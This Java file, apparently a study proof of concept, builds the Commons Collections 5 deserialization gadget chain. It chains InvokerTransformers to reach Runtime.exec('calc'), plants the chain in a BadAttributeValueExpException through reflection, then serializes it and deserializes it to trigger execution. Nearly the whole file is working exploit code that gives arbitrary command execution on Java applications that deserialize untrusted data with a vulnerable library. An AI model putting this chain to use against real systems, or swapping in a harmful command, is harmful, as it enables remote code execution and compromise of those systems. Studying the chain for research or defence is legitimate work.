import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception{
//      链式+Constant
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazy = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "aaa");

        tiedMapEntry.toString();

//        估计是IDEA debug的问题
//        BadAttributeValueExpException o = new BadAttributeValueExpException(tiedMapEntry);
        BadAttributeValueExpException o = new BadAttributeValueExpException(null);

        Class c = o.getClass();
        Field val = c.getDeclaredField("val");
        val.setAccessible(true);
        val.set(o,tiedMapEntry);

        serialize(o);
        unSerialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
